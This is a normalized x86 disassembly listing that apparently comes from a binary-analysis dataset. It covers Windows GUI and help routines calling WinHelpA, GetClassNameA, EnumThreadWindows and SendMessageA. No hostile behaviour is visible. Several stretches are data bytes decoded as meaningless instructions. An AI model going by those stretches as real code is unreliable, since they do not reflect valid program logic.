sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403fa4
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404264
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c624
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404264
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404504
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404264
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404504
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_40418c
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_40426c
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_4507d8
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403450
push ebp
call sub_443310
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404264
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_40418c
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_40418c
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_404324
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_4435c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443698
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44369f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_4436c8
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_4436f0
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_443730
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443714
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x194
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
sub_44375c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_443781
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443788
retn
sub_443888
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4566e8
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4438c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4438e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4438f0
retn
sub_4438fc
push 0xd0004916
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_44425f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4443ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444266
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fc8
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408408
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_444344
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408408
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403ff8
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_443aa8
mov eax [ ebp - 0x14 ]
call sub_404464
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_443996
inc esp
add [ edi + 0x39 ] bh
jg r-xdata
cmp dl [ ecx + edi + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ 0x3004439 ] al
inc esp
add [ ecx + 0x2d004439 ] cl
cmp [ eax + eax + 0x35 ] eax
cmp [ eax + eax + 0x3d ] eax
cmp [ eax + eax + 0x45 ] eax
cmp [ eax + eax + 0x4d ] eax
cmp [ eax + eax + 0x55 ] eax
cmp [ eax + eax + 0x5d ] eax
cmp [ eax + eax + 0x65 ] eax
cmp [ eax + eax + 0x6d ] eax
cmp [ eax + eax + 0xd ] eax
cmp [ eax + eax + 0x15 ] eax
cmp [ eax + eax + 0x1d ] eax
cmp [ eax + eax + 0x25 ] eax
cmp [ eax + eax + 0x5 ] eax
push ebp
cmp dl [ ecx + edi + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cmp [ eax + eax + 0x3 ] eax
and eax 0x5004439
cmp dl [ ecx + edi + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
movsb [ edi ] [ esi ]
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ eax * 2 + 0xe0044 ] bl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add al 0x11
inc eax
add [ eax + eax ] dl
add [ eax ] al
nop
rol [ edx ] 0x1c
add [ eax ] al
add [ esi ] cl
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443b5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fa4
test edi edi
jne r-xdata
inc esp
add al bl
cmp [ eax + eax ] eax
add [ eax ] al
add [ edx + edi + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2400443a ] dl
add [ eax ] al
add [ edx + edx + 0x40 ] ah
add [ esp + esi + 0x5a880040 ] bl
inc eax
add [ edx + ebx * 2 + 0x34b00040 ] dl
inc eax
add [ esp + esi + 0x5aa40040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
sbb al 0x45
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx ] al
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40403c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443b64
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404324
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_443aa8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443b5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fa4
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40403c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443b64
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404324
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_443b78
push ebx
mov ebx eax
mov eax ebx
call sub_443ea8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405a08
sub_443bb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443c1b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_443aa8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c22
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_443c2c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_443cb4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_443ba0
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404324
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443cbb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_443cc7
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_443d4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4443ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443d56
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_443aa8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443cd4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_443d4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4443ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443d56
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_443aa8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443d5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443e54
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_443aa8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092bc
mov eax ebx
call sub_4443ec
test al al
je r-xdata
mov ecx sub_4438fc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e5b
lea eax [ ebp - 0x1c ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_443aa8
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_444344
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403ff8
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404464
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443ec4
push ebx
mov ebx eax
mov eax ebx
call sub_443ea8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405a08
pop ebx
retn
mov eax rw-data
call sub_405a08
sub_443ef4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_443f4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f53
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_443aa8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_443f5c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444052
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_40927c
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_443aa8
mov eax ebx
call sub_4443ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444059
lea eax [ ebp - 0x110 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404214
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_444344
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404214
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_444070
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4440d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4440d9
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_443aa8
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_4440e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444164
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_443aa8
mov eax ebx
call sub_4443ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44416b
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_444344
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_444274
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408ce0
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_4442cf
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408cbc
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_444344
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404454
xor eax eax
push ebp
push sub_4443ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_444328
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4443c1
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_408130
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_4443d0
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4443ec
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_444328
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_4443cc
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_4443d0
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_444448
sub_444448
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4444c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_443ea8
call GetTickCount
mov ebx eax
push 0x0
call sub_40656c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_443aa8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444cc
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4444d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403578
call sub_405a20
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_44451c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_444548
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4445b6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4445bd
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405a08
mov eax rw-data
call sub_405a08
mov eax rw-data
call sub_405a08
mov eax rw-data
call sub_403fa4
mov eax rw-data
call sub_405a08
mov eax [ rw-data ]
call sub_443b78
sub_4445c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444612
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444619
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4444d4
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405a08
mov edx eax
mov eax [ rw-data ]
call sub_42c430
sub_44461c
and [ esi + 0x44 ] al
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
inc esp
jne r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
inc edi
inc esp
add [ eax + eax ] bh
add [ eax ] al
lodsb [ esi ]
inc esi
inc esp
add [ esp + esi + 0x75a40040 ] bl
add [ ebx ] cl
push esp
inc esp
jb r-xdata
nop
cmp al 0x46
inc esp
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add al bh
inc esi
inc esp
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + eax ] dh
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ ebp + esi * 2 + 0x75940044 ] ah
inc esp
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add ah bl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x47
jae r-xdata
inc edx
popad
jae r-xdata
add [ esi * 2 + 0x74200044 ] bl
inc esp
add al bl
jne r-xdata
inc esp
add [ ebp + esi * 2 + 0x34b00044 ] dl
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp + 0x47 ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 8 + 0x46 ] si
inc esp
add [ ecx + edx + 0x40 ] dl
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
add [ eax ] ah
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 ] bl
jb r-xdata
